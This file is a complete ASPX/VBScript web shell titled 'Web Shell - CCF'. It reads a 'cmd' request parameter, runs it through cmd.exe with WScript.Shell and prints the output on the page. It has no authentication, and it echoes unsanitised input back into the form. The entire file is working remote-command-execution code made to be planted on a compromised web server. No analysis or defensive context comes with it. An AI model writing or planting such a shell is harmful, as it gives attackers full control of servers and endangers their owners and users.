<%--
            ASPX Webshell - 20210512     
--%>


<html xmlns="www.w3.org/1999/xhtml">
<head runat="server">
    <title>Web Shell - CCF</title>
</head>
<body>

	<%
	Dim objShell, objCmdExec,getCommandOutput, objCmd
	objCmd = request("cmd")
	%>

	<form action="" method="get">
    <input type="text" name="cmd" value="<%= objCmd %>">
    <input type="submit" value="Run">
    <div> 
    <%@ LANGUAGE = "VBSCRIPT" %>
    <%

    objShell = CreateObject("WScript.Shell")
	objCmdExec = objshell.exec("cmd.exe /c " & objCmd)
	getCommandOutput = objCmdExec.StdOut.ReadAll
	response.write ("Command Output: " & getCommandOutput)
    %>
	</div>
    </form>
    
    
</body>
</html>